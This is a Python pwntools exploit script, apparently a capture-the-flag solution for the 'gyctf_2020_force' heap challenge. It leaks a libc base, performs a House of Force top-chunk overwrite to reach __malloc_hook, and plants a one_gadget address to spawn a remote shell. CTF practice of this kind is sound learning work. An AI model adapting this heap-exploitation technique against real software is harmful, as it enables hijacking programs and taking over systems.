#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/24 22:30:00
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
debug = 0
if debug:
    sh = process("gyctf_2020_force")
else:
    sh = remote("node3.buuoj.cn",27458)
elf = ELF("gyctf_2020_force")
libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')

def add(size,content):
    sh.recvuntil("2:puts\n")
    sh.sendline("1")
    sh.recvuntil("size\n")
    sh.sendline(str(size))
    sh.recvuntil("bin addr 0x")
    leak = int(sh.recvuntil('\n').strip(), 16)
    sh.recvuntil("content\n")
    sh.sendline(content)
    return leak

libc_base = add(0x200000, 'aaa') + 0x200ff0
log.info("Success leak libc_base:0x%x"%libc_base)
payload = "a" * 0x10 + p64(0) + p64(0x7FFFFFFFFFFFFFFF)
heap_addr = add(0x18, 'a'*0x10+p64(0)+p64(0xffffffffffffffff))
top_chunk = heap_addr + 0x10
# log.info("Success get heap_base:0x%x"%heap_base)
log.info("Success get top_chunk:0x%x"%top_chunk)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info("success get malloc_hook:0x%x"%malloc_hook)
relloc = libc_base + libc.symbols['__libc_realloc']
# gdb.attach(sh)
# pause()
one_gadget = [0x45216, 0x4526a, 0xf0274, 0xf1117]
one = libc_base + one_gadget[1]
offset = malloc_hook - top_chunk

add(offset - 0x33,'aaa\n')
add(0x18,"aaaaaaaa" + p64(one) + p64(relloc + 0x10))
sh.recvuntil("2:puts\n")
sh.sendline("1")
sh.recvuntil("size\n")
sh.sendline("1")
sh.interactive()